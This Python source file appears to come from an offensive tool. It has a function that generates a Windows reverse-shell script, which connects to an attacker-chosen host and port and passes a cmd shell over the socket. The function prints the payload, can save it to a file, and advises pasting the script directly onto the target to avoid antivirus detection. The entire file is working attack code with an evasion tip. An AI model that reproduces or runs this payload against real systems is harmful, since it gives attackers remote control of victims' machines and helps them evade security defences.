def generate_python_cmd(lhost, lport):
    python_script = f'''
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))

p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()'''

    print('---------------------------------------------------------------------------')
    print('')
    print(python_script)
    print('')
    print('')
    print('---------------------------------------------------------------------------')
    print('')
    while True:
        choice = input("Do you want to save the script as a .py file? (Y/N): ").lower()
        if choice == 'y':
            filename = input("Enter the filename (without .py extension): ")
            with open(f'output/{filename}.py', 'w') as f:
                f.write(python_script)
            print('')
            print(f"The Python script has been saved as {filename}.py in the output folder")
            print('')
            print('''Note that the .py script may be flagged by AV,
if going for stealthy option, paste the above script directly on target. ''')
            break
        elif choice == 'n':
            break
        else:
            print('Invalid input. Please enter Y or N.')
            

